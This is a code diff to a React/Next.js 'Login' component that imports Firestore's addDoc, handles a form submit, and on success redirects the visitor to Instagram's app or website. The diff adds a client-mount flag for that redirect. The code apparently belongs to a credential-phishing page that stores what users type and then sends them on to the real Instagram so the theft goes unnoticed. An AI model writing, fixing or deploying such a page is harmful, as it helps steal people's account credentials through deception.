@@ -1,4 +1,3 @@
-"use client";
 import React, { useState, useEffect } from 'react';
 import { firestore } from './firebaseconfig'; // Adjust the import path
 import { collection, addDoc } from 'firebase/firestore'; // Import the necessary functions
@@ -11,7 +10,13 @@ export default function Login() {
   const [error, setError] = useState('');
   const [success, setSuccess] = useState('');
   const [loading, setLoading] = useState(false); // Add loading state
+  const [isClient, setIsClient] = useState(false);
   const router = useRouter(); // Hook for routing
+
+  useEffect(() => {
+    // Set client-side flag once component is mounted
+    setIsClient(true);
+  }, []);
 
   const handleSubmit = async (event) => {
     event.preventDefault();
@@ -43,16 +48,16 @@ export default function Login() {
       setLoading(false); // Set loading to false after completing the submit process
     }
   };
+
   useEffect(() => {
-    if (success) {
-      
+    if (success && isClient) {
       if (navigator.userAgent.match(/Android|iPhone/i)) {
         router.push('instagram://'); // This won't work in many browsers
       } else {
         router.push('https://www.instagram.com');
       }
     }
-  }, [success]);
+  }, [success, isClient]);
 
   return (
     <div className="min-h-screen flex flex-col justify-center items-center">
